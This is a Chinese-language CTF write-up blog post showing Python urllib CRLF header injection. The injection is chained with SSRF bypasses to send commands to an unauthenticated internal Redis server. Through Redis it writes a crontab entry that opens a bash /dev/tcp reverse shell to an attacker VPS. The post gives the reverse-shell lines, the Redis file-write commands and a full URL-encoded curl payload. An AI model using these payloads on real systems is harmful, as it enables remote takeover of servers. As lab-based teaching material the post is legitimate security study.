---
title: Hack Redis via Python urllib HTTP Header Injection
tags: [write-up]
date: 2017-06-16 00:39
---
本篇文章带来的是python低版本的urllib 头部注入，攻击目标为局域网内的Redis，结合着一道CTF实例，演示整个攻击过程
<!-- more -->
<link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css">
<div class="markdown_views"><blockquote>
<p>本篇文章带来的是python低版本的urllib 头部注入，攻击目标为局域网内的Redis，结合着一道CTF实例，演示整个攻击过程</p>
</blockquote>
<p><div class="toc"><div class="toc">
<ul>
<li><a href="#0x01-简介">0x01 简介</a></li>
<li><a href="#0x02-环境搭建">0x02 环境搭建</a></li>
<li><a href="#0x03-题目分析">0x03 题目分析</a><ul>
<li><a href="#0x1-ssrf">0x1 ssrf</a></li>
<li><a href="#0x2-python-urllib-注入">0x2 python urllib 注入</a><ul>
<li><a href="#1-docker-1">docker 1</a></li>
<li><a href="#2docker-2">docker 2</a></li>
</ul>
</li>
<li><a href="#0x3-redis攻击方式">0x3 redis攻击方式</a><ul>
<li><a href="#1webshell">webshell</a></li>
<li><a href="#2利用redis写恶意命令">利用redis写恶意命令</a></li>
<li><a href="#3接收反弹的shell">接收反弹的shell</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
</div>
</p>
<h1 id="0x01-简介">0x01 简介</h1>
<p>2016年6月BLINDSPOT披露了Python urllib http头注入漏洞：<a href="http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html">http://blog.blindspotsecurity.com/2016/06/advisory-http-header-injection-in.html</a> <br>
通过这个漏洞，如果使用了Python的urllib库，并且请求的url为用户可控，那么就可能存在内网被探测的风险，如果本机或内网服务器中装有未授权访问的redis，那么服务器则有被getshell的风险。</br></p>
<h1 id="0x02-环境搭建">0x02 环境搭建</h1>
<blockquote>
<p>利用2016hctf ATfeild 源码搭建 <br>
<a href="https://github.com/LoRexxar/hctf2016_atfield">https://github.com/LoRexxar/hctf2016_atfield</a></br></p>
</blockquote>
<table>
<thead>
<tr>
<th>主机</th>
<th>ip</th>
<th>配置</th>
</tr>
</thead>
<tbody><tr>
<td>本机</td>
<td>172.17.0.1</td>
<td>Ubuntu:16.04</td>
</tr>
<tr>
<td>docker1</td>
<td>172.17.0.2</td>
<td>Ubuntu:16.04 python2.7.6（源码编译）</td>
</tr>
<tr>
<td>docker2</td>
<td>172.17.0.4</td>
<td>centos:6 redis2.4.3</td>
</tr>
</tbody></table>
<h1 id="0x03-题目分析">0x03 题目分析</h1>
<p>整个题目只有一个输入框 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616004313699?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
要求输入图片的url ，后台的访问过程因该是直接去请求文件 <br>
打印出来的image地址很可疑 怀疑是ssrf</br></br></img></br></p>
<p>下一步就是寻找内网主机</p>
<h2 id="0x1-ssrf">0x1 ssrf</h2>
<p>这里我们测试能发现，并不允许ip的请求，也就是描述中所说的，请求必须符合.tld标准并且包含域名，如果想要请求127.0.0.1，我们这里有两种绕过方式</p>
<p>1、 <a href="http://www.127.0.0.1.xip.io">http://www.127.0.0.1.xip.io</a></p>
<p>这种方式可以自动把域名指向中间的ip，在一些特殊情况下非常好用</p>
<p>2、 <a href="http://xxxxx/?u=http://127.0.0.1">http://xxxxx/?u=http://127.0.0.1</a></p>
<p>在有域名的vps上写一个跳转页面实现，事实上，只有第二种做法可以顺利继续做下一题</p>
<p>这里采用两种方法结合的方式 <br>
构造<a href="http://www.vps.xip.io/302.php?u=http://127.0.0.1">http://www.vps.xip.io/302.php?u=http://127.0.0.1</a></br></p>
<h2 id="0x2-python-urllib-注入">0x2 python urllib 注入</h2>
<p>该漏洞的前提python版本为python3 &lt; 3.4.3 || python2 &lt; 2.7.9 （ps 这里python版本必须是自己编译的，虽然不知道为什么？？？）</p>
<p>首先我们了解一下什么是python urllib 注入</p>
<h3 id="1-docker-1">1. docker 1</h3>
<p>是对外开放的web服务器端 <br>
编写请求脚本</br></p>
<pre class="prettyprint"><code class=" hljs d"><span class="hljs-shebang">#!/usr/bin/env python                                                       </span>
# encoding: utf-<span class="hljs-number">8</span> 
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> urllib2
url = sys.argv[<span class="hljs-number">1</span>]
info = urllib2.urlopen(url)</code></pre>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010427229?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
通过发送请求 达到恶意数据被执行 <br>
<code>python a.py http://172.17.0.3%0d%0aset%20a%2012345%0d%0a:8888/</code> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010648352?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
首先在docker2中nc  -lp 8888端口 <br>
观察现象 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010827953?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
发现中间的字符串正常的解析了，正好是一组redis命令</br></img></br></br></br></img></br></br></br></img></p>
<h3 id="2docker-2">2.docker 2</h3>
<p>是内网中的服务器，里面有redis以及crontab任务管理 <br>
docker2中开启了redis服务</br></p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616010952682?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<p>如果刚才docker1中的请求端口是6379，那么就会吧aa变量加入到集合中，从而能证明header注入redis是否成功 <br>
最后看截图 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616011230120?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></br></p>
<p>成功解析语句并执行</p>
<h2 id="0x3-redis攻击方式">0x3 redis攻击方式</h2>
<p>首先整体的思路是用户通过操作docker1去访问docker2其中的数据具有恶意性，并且可以在docker2中解析执行，从而在docker2中进行破坏最后拿到webshell，系统管理权限</p>
<h3 id="1webshell">1.webshell</h3>
<p>利用最经典的webshell获取方法 <br>
通过1.2.2 我们能够绕过过滤，在通过1.2.1我们能够构造payload写入信息redis，再加上提示说有crontab，这样我们就可以通过redis来写crontab文件然后反弹shell。</br></p>
<p>正常我们在bash下反弹shell是这样子的命令</p>
<p><code>/bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1</code> <br>
写成计划任务形式，即crontab文件形式</br></p>
<p><code>*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1</code></p>
<p>代表每分钟执行一次</p>
<h3 id="2利用redis写恶意命令">2.利用redis写恶意命令</h3>
<p>通常来说我们在使用redis写文件方法如下：</p>
<pre class="prettyprint"><code class=" hljs cs"><span class="hljs-keyword">set</span> <span class="hljs-number">11</span> <span class="hljs-string">"*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/ip地址/端口号 0&gt;&amp;1"</span>
config <span class="hljs-keyword">set</span> dir /<span class="hljs-keyword">var</span>/spool/cron
config <span class="hljs-keyword">set</span> dbfilename root
save
</code></pre>
<p>但本题采取了另一个方式 因为redis不会识别空格</p>
<pre class="prettyprint"><code class=" hljs livecodeserver">（<span class="hljs-number">1</span>） <span class="hljs-built_in">set</span> <span class="hljs-number">11</span> <span class="hljs-string">"\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/(vps address)/12345 0&gt;&amp;1\n"</span>

*<span class="hljs-number">3</span>     <span class="hljs-comment"> //表示有三个参数</span>
$<span class="hljs-number">3</span>    <span class="hljs-comment"> //下面这个参数长度为3</span>
<span class="hljs-built_in">set</span>
$<span class="hljs-number">1</span>    <span class="hljs-comment"> //下面这个参数长度为1</span>
<span class="hljs-operator">a</span>       
$<span class="hljs-number">64</span>  <span class="hljs-comment"> //下面这个参数长度为64</span>
\n*/<span class="hljs-number">1</span> * * * * /bin/bash -i &gt;&amp; /dev/tcp/(vps address)/<span class="hljs-number">12345</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>\n</code></pre>
<p>这里\n在传输的时候替换成%0a，所以我们要传入的明文子串如下：</p>
<pre class="prettyprint"><code class=" hljs lasso">
<span class="hljs-keyword">link</span><span class="hljs-subst">=</span>http:<span class="hljs-comment">//www.(vps address).xip.io/302.php?url=http://172.17.0.4</span>
<span class="hljs-subst">*</span><span class="hljs-number">3</span>
$<span class="hljs-number">3</span>
<span class="hljs-built_in">set</span>
$<span class="hljs-number">1</span>
a
$<span class="hljs-number">64</span>
<span class="hljs-subst">*</span>/<span class="hljs-number">1</span> <span class="hljs-subst">*</span> <span class="hljs-subst">*</span> <span class="hljs-subst">*</span> <span class="hljs-subst">*</span> /bin/bash <span class="hljs-attribute">-i</span> <span class="hljs-subst">&gt;&amp;</span> /dev/tcp<span class="hljs-subst">/</span>(vps address)/<span class="hljs-number">12345</span> <span class="hljs-number">0</span><span class="hljs-subst">&gt;&amp;</span><span class="hljs-number">1</span>
config <span class="hljs-built_in">set</span> dir /<span class="hljs-built_in">var</span>/spool/cron
config <span class="hljs-built_in">set</span> dbfilename root
save
:<span class="hljs-number">6379</span><span class="hljs-subst">/</span></code></pre>
<p>不能直接发送过去 ，首先进行进行URL编码转换，应该转换几次呢？ <br>
答案是3次 用户web浏览器一次/跳转一次/内网请求一次 <br>
在换行时必须采用%0d%0a 那么最后的形式是将下面的link再转码两次</br></br></p>
<pre class="prettyprint"><code class=" hljs perl"><span class="hljs-keyword">link</span>=http:<span class="hljs-regexp">//www</span>.(vps address).xip.io/<span class="hljs-number">302</span>.php?url=http:<span class="hljs-regexp">//</span><span class="hljs-number">172.17</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%2a3</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%243</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aset</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%241</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aa</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%2464</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span><span class="hljs-variable">%0a</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%2f1</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2a</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2fbin</span><span class="hljs-variable">%2fbash</span><span class="hljs-variable">%20</span>-i<span class="hljs-variable">%20</span><span class="hljs-variable">%3E</span><span class="hljs-variable">%26</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2fdev</span><span class="hljs-variable">%2ftcp</span><span class="hljs-variable">%2f</span>(vps address)<span class="hljs-variable">%2f12345</span><span class="hljs-variable">%200</span><span class="hljs-variable">%3E</span><span class="hljs-variable">%261</span><span class="hljs-variable">%0a</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aconfig</span><span class="hljs-variable">%20set</span><span class="hljs-variable">%20dir</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2fvar</span><span class="hljs-variable">%2fspool</span><span class="hljs-variable">%2fcron</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Aconfig</span><span class="hljs-variable">%20set</span><span class="hljs-variable">%20dbfilename</span><span class="hljs-variable">%20root</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0Asave</span><span class="hljs-variable">%0d</span><span class="hljs-variable">%0A</span>:<span class="hljs-number">6379</span>/</code></pre>
<p>利用crul 方法发送出去</p>
<pre class="prettyprint"><code class=" hljs perl">curl -d <span class="hljs-string">"link=http<span class="hljs-variable">%3A</span><span class="hljs-variable">%2f</span><span class="hljs-variable">%2fwww</span>.(vps address).xip.io<span class="hljs-variable">%2f302</span>.php<span class="hljs-variable">%3Furl</span><span class="hljs-variable">%3Dhttp</span><span class="hljs-variable">%253A</span><span class="hljs-variable">%252f</span><span class="hljs-variable">%252f172</span>.17.0.3<span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25252a3</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%2525243</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aset</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%2525241</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aa</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25252464</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%25250a</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%25252f1</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252a</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252fbin</span><span class="hljs-variable">%25252fbash</span><span class="hljs-variable">%252520</span>-i<span class="hljs-variable">%252520</span><span class="hljs-variable">%25253E</span><span class="hljs-variable">%252526</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252fdev</span><span class="hljs-variable">%25252ftcp</span><span class="hljs-variable">%25252f</span>(vps address)<span class="hljs-variable">%25252f12345</span><span class="hljs-variable">%2525200</span><span class="hljs-variable">%25253E</span><span class="hljs-variable">%2525261</span><span class="hljs-variable">%25250a</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aconfig</span><span class="hljs-variable">%252520set</span><span class="hljs-variable">%252520dir</span><span class="hljs-variable">%252520</span><span class="hljs-variable">%25252fvar</span><span class="hljs-variable">%25252fspool</span><span class="hljs-variable">%25252fcron</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Aconfig</span><span class="hljs-variable">%252520set</span><span class="hljs-variable">%252520dbfilename</span><span class="hljs-variable">%252520root</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250Asave</span><span class="hljs-variable">%25250d</span><span class="hljs-variable">%25250A</span><span class="hljs-variable">%253A6379</span><span class="hljs-variable">%252f</span>"</span> <span class="hljs-string">"http://172.17.0.4:8000/show"</span> -v -L</code></pre>
<p>执行结果如下 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616014958229?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616015042229?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
成功执行 <br>
观察 redis端的情况 <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616015131715?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br>
<img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616020355536?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></br></img></br></br></br></img></br></img></br></p>
<p>成功实现计划任务的写入 <br>
下面就是vps接受反弹的shell</br></p>
<h3 id="3接收反弹的shell">3.接收反弹的shell</h3>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616020911274?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p></div>